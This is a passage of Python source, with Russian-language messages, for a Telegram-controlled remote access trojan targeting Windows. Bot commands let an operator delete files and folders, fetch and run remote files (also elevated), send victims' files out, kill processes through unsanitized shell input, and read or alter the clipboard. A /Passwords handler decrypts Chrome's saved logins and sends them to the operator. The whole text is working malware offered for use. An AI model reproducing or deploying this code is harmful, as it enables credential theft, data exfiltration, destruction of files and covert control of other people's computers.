    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
    bot.send_message(message.chat.id, 
      'Папка *' + user_msg.split("/remove ")[1] + '* удалена!'
      '\n'
      '\nСоздана » %02d/%02d/%d'%(day,month,year) +
      '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
      '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
      parse_mode="Markdown")
  except FileNotFoundError:
    bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except PermissionError:
    bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
    bot.send_message(message.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def removeall(command):
 try:
  folder = os.getcwd()
  folder_size = 0
  for (path, dirs, files) in os.walk(folder):
    for file in files:
      filename = os.path.join(path, file)
      folder_size += os.path.getsize(filename)
  files = folders = 0
  for _, dirnames, filenames in os.walk(os.getcwd()):
      files += len(filenames)
      folders += len(dirnames)
  a = (len(glob.glob('*')))
  try:
   for file in glob.glob('*.*'):
    if os.path.isfile(file):
      os.remove(file)
   for directory in glob.glob('*/'):
    if os.path.exists(directory):
      shutil.rmtree(directory)
  except PermissionError:
     pass
  b = (len(glob.glob('*')))
  c = (a - b)
  bot.send_message(command.chat.id,
     'Удалено *' + str(c) + '* файлов из *' + str(a) + '*!'
     '\n'
     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
     '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
     parse_mode="Markdown")
 except:
  pass

@bot.message_handler(commands=['Upload', 'upload'])
def upload(message):
 try:
  user_msg = "{0}".format(message.text)
  url = user_msg.split(" ")[1]
  req = urllib.request.Request(url, method='HEAD')
  r = urllib.request.urlopen(req)
  file_name = 'C:\\ProgramData\\Files\\' + r.info().get_filename()
  bot.send_message(message.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
  urllib.request.urlretrieve(url, file_name)
  bot.reply_to(message, '*Файл загружен на компьютер!*\n \n`' + file_name + '`', parse_mode="Markdown")
 except urllib.error.HTTPError as err:
  bot.send_message(message.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
 except ValueError:
  bot.send_message(message.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n› /Upload*', parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def document(message):
 try:
  file_info = bot.get_file(message.document.file_id)
  bot.send_message(message.chat.id, '*Скачиваем...*', parse_mode="Markdown")
  downloaded_file = bot.download_file(file_info.file_path)
  src='C:\\ProgramData\\Files\\'+file_info.file_path;
  with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)
  bot.reply_to(message, '*Файл загружен на компьютер!*\n \n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.reply_to(message, '*Формат файла не поддерживается*', parse_mode="Markdown")
 except:
  bot.reply_to(message, '*Не удалось загрузить файл*', parse_mode="Markdown")

@bot.message_handler(commands=['Download'])
def download(message):
 try:
  user_msg = "{0}".format(message.text)
  download = open(os.getcwd() + '\\' + user_msg.split("/Download ")[1], 'rb')
  bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
  bot.send_chat_action(message.chat.id, 'upload_document')
  bot.send_document(message.chat.id, download)
 except FileNotFoundError:
  bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  try:
    bot.send_message(message.chat.id, '*Собираем...*', parse_mode="Markdown")
    shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/Download ")[1],
                            'zip',
                            os.getcwd(),
                            user_msg.split("/Download ")[1])
    bot.send_chat_action(message.chat.id, 'upload_document')
    file = open('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip', 'rb')
    bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
    bot.send_document(message.chat.id, file)
    file.close()
    os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
  except:
    try:
        file.close()
        os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
        bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
    except:
        bot.send_message(message.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")

@bot.message_handler(commands=['download'])
def download(message):
 try:
  user_msg = "{0}".format(message.text)
  download = open(os.getcwd() + '\\' + user_msg.split("/download ")[1], 'rb')
  bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
  bot.send_chat_action(message.chat.id, 'upload_document')
  bot.send_document(message.chat.id, download)
 except FileNotFoundError:
  bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  try:
    bot.send_message(message.chat.id, '*Собираем...*', parse_mode="Markdown")
    shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/download ")[1],
                            'zip',
                            os.getcwd(),
                            user_msg.split("/download ")[1])
    bot.send_chat_action(message.chat.id, 'upload_document')
    file = open('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip', 'rb')
    bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
    bot.send_document(message.chat.id, file)
    file.close()
    os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
  except:
    try:
        file.close()
        os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
        bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
    except:
        bot.send_message(message.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")

@bot.message_handler(commands=['Run'])
def run(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(os.getcwd() + '\\' + user_msg.split("/Run ")[1])
  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/Run ")[1] + '* открыт!', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")

@bot.message_handler(commands=['run'])
def run(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(os.getcwd() + '\\' + user_msg.split("/run ")[1])
  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/run ")[1] + '* открыт!', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
    bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")

@bot.message_handler(commands=['RunAS'])
def runas(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(os.getcwd() + '\\' + user_msg.split("/RunAS ")[1], 'runas')
  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/RunAS ")[1] + '* открыт!', parse_mode="Markdown")
 except OSError:
 	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")

@bot.message_handler(commands=['runas'])
def runas(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.startfile(os.getcwd() + '\\' + user_msg.split("/runas ")[1], 'runas')
  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/runas ")[1] + '* открыт!', parse_mode="Markdown")
 except OSError:
 	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
 except FileNotFoundError:
 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")

@bot.message_handler(commands=['PWD', 'pwd'])
def pwd(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  dirs = '\n``'.join(os.listdir(path="."))
  bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n \n' + '`' + dirs + '`', parse_mode="Markdown")
 except:
  try:
    bot.send_chat_action(command.chat.id, 'typing')
    dirse = '\n'.join(os.listdir(path="."))
    splitted_text = util.split_string(dirse, 4096)
    for dirse in splitted_text:
      bot.send_message(command.chat.id, '`' + dirse + '`', parse_mode="Markdown")
  except:
    pass

@bot.message_handler(commands=['Cancel', 'cancel'])
def cancelfiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")

@bot.message_handler(commands=['Tasklist', 'tasklist'])
def tasklist(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  procs = [proc.name().replace('.exe', '') for proc in psutil.process_iter()]
  sprocs = '\n'.join(procs)
  bot.send_message(command.chat.id, '`' + sprocs + '`', parse_mode="Markdown")
 except:
  pass

@bot.message_handler(commands=['Taskkill', 'taskkill'])
def taskkill(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.system("taskkill /f /im  " + user_msg.split(" ")[1] + '.exe')
  bot.send_message(message.chat.id, "Процесс *" + user_msg.split(" ")[1] + "* остановлен!", parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, 
  '*Введите название процесса'
  '\n'
  '\n› /Taskkill*'
  '\n'
  '\n*Активное окно*'
  '\n'
  '\n`' + GetWindowText(GetForegroundWindow()) + '`',
  reply_markup=main13, parse_mode="Markdown")

@bot.message_handler(commands=['Message'])
def message(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  ctypes.windll.user32.MessageBoxW(0, user_msg.split("/Message ")[1], u'Information', 0x10)
  bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")

@bot.message_handler(commands=['message'])
def message(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  ctypes.windll.user32.MessageBoxW(0, user_msg.split("/message ")[1], u'Information', 0x10)
  bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")

@bot.message_handler(commands=['OpenURL', 'openurl'])
def openurl(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  url = user_msg.split(" ")[1]
  webbrowser.open_new_tab(url)
  bot.reply_to(message, '*Ссылка открыта!*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, '*Вставьте ссылку\n \n› /OpenURL*', parse_mode="Markdown")

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def wallpapers(command):
 bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def wallpapers(message):
 try:
  file_info = bot.get_file(message.photo[len(message.photo)-1].file_id)
  downloaded_file = bot.download_file(file_info.file_path)
  src='C:\\ProgramData\\Files\\'+file_info.file_path;
  with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)
  ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\\ProgramData\\Files\\' + file_info.file_path, 0)
  bot.reply_to(message, '*Фотография установлена на обои!*', parse_mode="Markdown")
  time.sleep(3)
  os.remove('C:\\ProgramData\\Files\\' + file_info.file_path)
 except:
  bot.reply_to(message, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['Voice', 'voice'])
def voice(command):
 bot.send_message(command.chat.id, '*Введите текст\n \n› /Say*', parse_mode="Markdown")

@bot.message_handler(commands=['Say'])
def say(message):
 try:
  from win32com.client import constants, Dispatch
  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
  user_msg = "{0}".format(message.text)
  devices = AudioUtilities.GetSpeakers()
  interface = devices.Activate(
      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
  volume = cast(interface, POINTER(IAudioEndpointVolume))
  volume.SetMasterVolumeLevel(-0.0, None)
  speaker = Dispatch("SAPI.SpVoice")
  speaker.Speak(user_msg.split("/Say")[1])
  del speaker
  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
 except:
  pass

@bot.message_handler(commands=['say'])
def say(message):
 try:
  from win32com.client import constants, Dispatch
  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
  user_msg = "{0}".format(message.text)
  devices = AudioUtilities.GetSpeakers()
  interface = devices.Activate(
      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
  volume = cast(interface, POINTER(IAudioEndpointVolume))
  volume.SetMasterVolumeLevel(-0.0, None)
  speaker = Dispatch("SAPI.SpVoice")
  speaker.Speak(user_msg.split("/say")[1])
  del speaker
  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
 except:
  pass

@bot.message_handler(commands=['Passwords', 'passwords'])
def passwords(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_document')
  from cryptography.hazmat.backends import default_backend
  from cryptography.hazmat.primitives.ciphers import (
      Cipher, algorithms, modes)

  NONCE_BYTE_SIZE = 12

  def encrypt(cipher, plaintext, nonce):
      cipher.mode = modes.GCM(nonce)
      encryptor = cipher.encryptor()
      ciphertext = encryptor.update(plaintext)
      return (cipher, ciphertext, nonce)

  def decrypt(cipher, ciphertext, nonce):
      cipher.mode = modes.GCM(nonce)
      decryptor = cipher.decryptor()
      return decryptor.update(ciphertext)

  def get_cipher(key):
      cipher = Cipher(
          algorithms.AES(key),
          None,
          backend=default_backend()
      )
      return cipher

  APP_DATA_PATH= os.environ['LOCALAPPDATA']
  DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

  def dpapi_decrypt(encrypted):
      class DATA_BLOB(ctypes.Structure):
          _fields_ = [('cbData', ctypes.wintypes.DWORD),
                      ('pbData', ctypes.POINTER(ctypes.c_char))]

      p = ctypes.create_string_buffer(encrypted, len(encrypted))
      blobin = DATA_BLOB(ctypes.sizeof(p), p)
      blobout = DATA_BLOB()
      retval = ctypes.windll.crypt32.CryptUnprotectData(
          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
      if not retval:
          raise ctypes.WinError()
      result = ctypes.string_at(blobout.pbData, blobout.cbData)
      ctypes.windll.kernel32.LocalFree(blobout.pbData)
      return result

  def unix_decrypt(encrypted):
      if sys.platform.startswith('linux'):
          password = 'peanuts'
          iterations = 1
      else:
          raise NotImplementedError

      from Crypto.Cipher import AES
      from Crypto.Protocol.KDF import PBKDF2

      salt = 'saltysalt'
      iv = ' ' * 16
      length = 16
      key = PBKDF2(password, salt, length, iterations)
      cipher = AES.new(key, AES.MODE_CBC, IV=iv)
      decrypted = cipher.decrypt(encrypted[3:])
      return decrypted[:-ord(decrypted[-1])]

  def get_key_from_local_state():
      jsn = None
      with open(os.path.join(os.environ['LOCALAPPDATA'],
          r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
          jsn = json.loads(str(f.readline()))
      return jsn["os_crypt"]["encrypted_key"]

  def aes_decrypt(encrypted_txt):
      encoded_key = get_key_from_local_state()
      encrypted_key = base64.b64decode(encoded_key.encode())
      encrypted_key = encrypted_key[5:]
      key = dpapi_decrypt(encrypted_key)
      nonce = encrypted_txt[3:15]
      cipher = get_cipher(key)
      return decrypt(cipher,encrypted_txt[15:],nonce)

  class ChromePassword:
      def __init__(self):
          self.passwordList = []

      def get_chrome_db(self):
          _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
          _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
          if os.path.exists(_temp_path):
              os.remove(_temp_path)
          shutil.copyfile(_full_path,_temp_path)
          self.show_password(_temp_path)

      def show_password(self,db_file):
          conn = sqlite3.connect(db_file)
          _sql = 'select signon_realm,username_value,password_value from logins'
          for row in conn.execute(_sql):
              host = row[0]
              if host.startswith('android'):
                  continue
              name = row[1]
              value = self.chrome_decrypt(row[2])
              _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
              self.passwordList.append(_info)
          conn.close()
          os.remove(db_file)

      def chrome_decrypt(self,encrypted_txt):
          if sys.platform == 'win32':
              try:
                  if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                      decrypted_txt = dpapi_decrypt(encrypted_txt)
                      return decrypted_txt.decode()
                  elif encrypted_txt[:3] == b'v10':
                      decrypted_txt = aes_decrypt(encrypted_txt)
                      return decrypted_txt[:-16].decode()
              except WindowsError:
                  return None
          else:
              try:
                  return unix_decrypt(encrypted_txt)
              except NotImplementedError:
                  return None

      def save_passwords(self):
          with open('C:\\ProgramData\\Passwords.txt','w',encoding='utf-8') as f:
              f.writelines(self.passwordList)

  if __name__=="__main__":
      Main = ChromePassword()
      Main.get_chrome_db()
      Main.save_passwords()
      try:
       passwords = open('C:\\ProgramData\\Passwords.txt')
       bot.send_document(command.chat.id, passwords)
       passwords.close()
       os.remove('C:\\ProgramData\\Passwords.txt')
      except:
       pass
 except:
 	bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")

@bot.message_handler(commands=['Clipboard'])
def clipboard(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  pyperclip.copy(user_msg.split("/Clipboard ")[1])
  bot.send_message(message.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id,
  '*Введите текст'
  '\n'
  '\n› /Clipboard'
  '\n'
  '\nБуфер обмена*'
  '\n'
  '\n« `' + pyperclip.paste() + '` »',
  parse_mode="Markdown")

@bot.message_handler(commands=['clipboard'])
def clipboard(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  pyperclip.copy(user_msg.split("/clipboard ")[1])
  bot.send_message(message.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id,
  '*Введите текст'
  '\n'
  '\n› /clipboard'
  '\n'
  '\nБуфер обмена*'
  '\n'
  '\n« `' + pyperclip.paste() + '` »',
  parse_mode="Markdown")

try:
  bot.polling(none_stop=True)
except:
  os.startfile(sys.argv[0])
  sys.exit()
